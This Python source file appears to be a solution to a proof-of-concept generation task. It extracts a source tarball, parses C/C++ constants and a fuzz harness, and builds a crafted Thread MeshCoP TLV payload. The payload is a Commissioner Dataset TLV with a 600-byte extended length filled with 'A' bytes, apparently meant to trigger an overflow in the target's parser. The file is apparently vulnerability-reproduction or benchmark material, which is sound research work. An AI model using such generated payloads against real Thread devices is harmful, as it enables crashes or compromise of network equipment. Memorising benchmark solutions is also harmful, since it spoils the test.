import os
import tarfile
import tempfile
import shutil
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._extract_tar(src_path)
        try:
            enum_values, const_values = self._scan_constants(root)
            values = {}
            values.update(enum_values)
            values.update(const_values)

            extended_length_marker = self._get_int(values, "kExtendedLength")
            if extended_length_marker is None:
                extended_length_marker = 0xFF
            extended_length_marker &= 0xFF

            state_accept_value = self._get_int(values, "kAccept")
            if state_accept_value is None:
                state_accept_value = 1
            state_accept_value &= 0xFF

            tlv_state_type = self._get_int(values, "kState")
            tlv_session_type = self._get_int(values, "kCommissionerSessionId")
            tlv_dataset_type = self._get_int(values, "kCommissionerDataset")

            # Provide a reasonable fallback for dataset type if parsing failed
            if tlv_dataset_type is None:
                # In Thread MeshCoP TLVs, Commissioner Dataset is typically in low range (e.g., ~13)
                tlv_dataset_type = 13
            tlv_dataset_type &= 0xFF

            if tlv_state_type is not None:
                tlv_state_type &= 0xFF
            if tlv_session_type is not None:
                tlv_session_type &= 0xFF

            session_id = self._guess_session_id(root, values)
            session_id &= 0xFFFF

            # Length for the Commissioner Dataset TLV value; must be >255 to require extended length
            dataset_length = 600

            payload = bytearray()

            # Optional State TLV
            if tlv_state_type is not None:
                payload.append(tlv_state_type)
                payload.append(1)  # length
                payload.append(state_accept_value)

            # Optional Commissioner Session ID TLV
            if tlv_session_type is not None:
                payload.append(tlv_session_type)
                payload.append(2)  # length
                payload.append((session_id >> 8) & 0xFF)
                payload.append(session_id & 0xFF)

            # Commissioner Dataset TLV with extended length
            payload.append(tlv_dataset_type)
            payload.append(extended_length_marker)
            payload.append((dataset_length >> 8) & 0xFF)
            payload.append(dataset_length & 0xFF)
            payload.extend(b"A" * dataset_length)

            return bytes(payload)
        finally:
            shutil.rmtree(root, ignore_errors=True)

    # ----------------- Filesystem / extraction helpers -----------------

    def _extract_tar(self, src_path: str) -> str:
        temp_dir = tempfile.mkdtemp(prefix="pocgen_")
        with tarfile.open(src_path, "r:*") as tar:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory

            for member in tar.getmembers():
                member_path = os.path.join(temp_dir, member.name)
                if not is_within_directory(temp_dir, member_path):
                    continue
                tar.extract(member, temp_dir)

        # If tarball has a single top-level directory, use it
        entries = [os.path.join(temp_dir, e) for e in os.listdir(temp_dir)]
        dirs = [e for e in entries if os.path.isdir(e)]
        if len(dirs) == 1 and all(not os.path.isfile(e) for e in entries if e != dirs[0]):
            return dirs[0]
        return temp_dir

    # ----------------- Parsing helpers -----------------

    def _scan_constants(self, root: str):
        enum_values = {}
        const_values = {}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                cleaned = self._remove_c_comments(text)
                self._parse_enums(cleaned, enum_values)
                self._parse_constant_assigns(cleaned, enum_values, const_values)
        return enum_values, const_values

    def _remove_c_comments(self, text: str) -> str:
        # Remove /* ... */ comments
        text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
        # Remove // ... comments
        text = re.sub(r"//.*", "", text)
        return text

    def _parse_enums(self, text: str, enum_values: dict):
        enum_pattern = re.compile(r"\benum\b[^{}]*\{([^}]*)\}", re.S)
        for m in enum_pattern.finditer(text):
            body = m.group(1)
            parts = body.split(",")
            cur_val = None
            for part in parts:
                line = part.strip()
                if not line:
                    continue
                m_item = re.match(r"([A-Za-z_]\w*)\s*(?:=\s*(.*))?$", line)
                if not m_item:
                    continue
                name = m_item.group(1)
                value_expr = m_item.group(2)
                if value_expr is not None:
                    value_expr = value_expr.strip()
                    val = self._parse_int_expr(value_expr, enum_values, allow_unknown=True)
                    if val is None:
                        if cur_val is None:
                            cur_val = -1
                        val = cur_val + 1
                else:
                    if cur_val is None:
                        val = 0
                    else:
                        val = cur_val + 1
                enum_values[name] = val
                cur_val = val

    def _parse_constant_assigns(self, text: str, enum_values: dict, const_values: dict):
        pattern = re.compile(
            r"\b(?:static\s+)?(?:constexpr\s+)?(?:const\s+)?"
            r"(?:unsigned\s+|signed\s+)?"
            r"(?:char|short|int|long|long\s+long|uint8_t|uint16_t|uint32_t|uint64_t|size_t)\s+"
            r"([A-Za-z_]\w*)\s*=\s*([^;]+);"
        )
        known = dict(enum_values)
        known.update(const_values)
        for m in pattern.finditer(text):
            name = m.group(1)
            expr = m.group(2).strip()
            val = self._parse_int_expr(expr, known, allow_unknown=False)
            if val is None:
                val = self._parse_literal(expr)
            if val is not None:
                const_values[name] = val
                known[name] = val

        # Also parse simple #define macros
        define_pattern = re.compile(r"#define\s+([A-Za-z_]\w*)\s+([^\s/][^\n]*)")
        for m in define_pattern.finditer(text):
            name = m.group(1)
            expr = m.group(2).strip()
            val = self._parse_int_expr(expr, known, allow_unknown=False)
            if val is None:
                val = self._parse_literal(expr)
            if val is not None:
                const_values[name] = val
                known[name] = val

    def _parse_literal(self, expr: str):
        s = expr.strip()
        # Remove trailing type suffixes like U, UL, L, LL
        s = re.sub(r"[uUlL]+$", "", s)
        # Simple hex or decimal
        if re.fullmatch(r"0x[0-9a-fA-F]+", s):
            try:
                return int(s, 16)
            except Exception:
                return None
        if re.fullmatch(r"\d+", s):
            try:
                return int(s, 10)
            except Exception:
                return None
        return None

    def _parse_int_expr(self, expr: str, known: dict, allow_unknown: bool) -> int | None:
        expr = expr.strip()
        if not expr:
            return None
        # Remove casts like (uint8_t)
        expr = re.sub(r"\([^)]+\)", "", expr)

        unknown_seen = False

        def repl(m):
            nonlocal unknown_seen
            name = m.group(0)
            if name in known and isinstance(known[name], int):
                return str(known[name])
            unknown_seen = True
            return "0"

        # Replace identifiers with known constants
        expr_sub = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)
        if unknown_seen and not allow_unknown:
            return None

        # Now expression should only contain numbers, operators, spaces
        if not re.fullmatch(r"[0-9xXa-fA-F \t\+\-\*\/\|\&\^\~\(\)<>]+", expr_sub):
            return None
        try:
            val = int(eval(expr_sub, {"__builtins__": None}, {}))
            return val
        except Exception:
            return self._parse_literal(expr_sub)

    def _get_int(self, mapping: dict, name: str):
        val = mapping.get(name)
        return val if isinstance(val, int) else None

    # ----------------- Session ID guessing -----------------

    def _guess_session_id(self, root: str, values: dict) -> int:
        # Try to determine from fuzz harness
        harness = self._find_fuzzer_file(root)
        if harness is not None:
            try:
                with open(harness, "r", encoding="utf-8", errors="ignore") as f:
                    text = self._remove_c_comments(f.read())
                sess = self._session_id_from_text(text, root, values)
                if sess is not None:
                    return sess & 0xFFFF
            except Exception:
                pass

        # Try to see any initialization or assignment of mCommissionerSessionId
        sess2 = self._search_mcommissioner_session_id(root)
        if sess2 is not None:
            return sess2 & 0xFFFF

        # Fallback guess
        return 1

    def _find_fuzzer_file(self, root: str):
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" in text:
                    return path
        return None

    def _session_id_from_text(self, text: str, root: str, values: dict):
        pattern = re.compile(r"SetCommissionerSessionId\s*\(\s*([^\)]+)\)")
        for m in pattern.finditer(text):
            arg = m.group(1).split(",")[0].strip()
            # Try direct numeric expression
            val = self._parse_int_expr(arg, values, allow_unknown=False)
            if val is not None:
                return val
            # If argument is identifier, look for its definition
            if re.fullmatch(r"[A-Za-z_]\w*", arg):
                val2 = self._find_identifier_constant(root, arg, values)
                if val2 is not None:
                    return val2
        return None

    def _find_identifier_constant(self, root: str, name: str, values: dict):
        val = self._get_int(values, name)
        if isinstance(val, int):
            return val
        pattern_assign = re.compile(
            r"\b(?:static\s+)?(?:constexpr\s+)?(?:const\s+)?"
            r"(?:unsigned\s+|signed\s+)?"
            r"(?:char|short|int|long|long\s+long|uint8_t|uint16_t|uint32_t|uint64_t|size_t)\s+"
            + re.escape(name) + r"\s*=\s*([^;]+);"
        )
        define_pattern = re.compile(r"#define\s+" + re.escape(name) + r"\s+([^\s/][^\n]*)")
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = self._remove_c_comments(f.read())
                except Exception:
                    continue
                for m in pattern_assign.finditer(text):
                    expr = m.group(1).strip()
                    v = self._parse_int_expr(expr, values, allow_unknown=False)
                    if v is None:
                        v = self._parse_literal(expr)
                    if v is not None:
                        return v
                for m in define_pattern.finditer(text):
                    expr = m.group(1).strip()
                    v = self._parse_int_expr(expr, values, allow_unknown=False)
                    if v is None:
                        v = self._parse_literal(expr)
                    if v is not None:
                        return v
        return None

    def _search_mcommissioner_session_id(self, root: str):
        init_pattern = re.compile(r"mCommissionerSessionId\s*\(\s*(0x[0-9A-Fa-f]+|\d+)\s*\)")
        assign_pattern = re.compile(r"mCommissionerSessionId\s*=\s*(0x[0-9A-Fa-f]+|\d+)")
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = self._remove_c_comments(f.read())
                except Exception:
                    continue
                m = init_pattern.search(text)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        pass
                m = assign_pattern.search(text)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        pass
        return None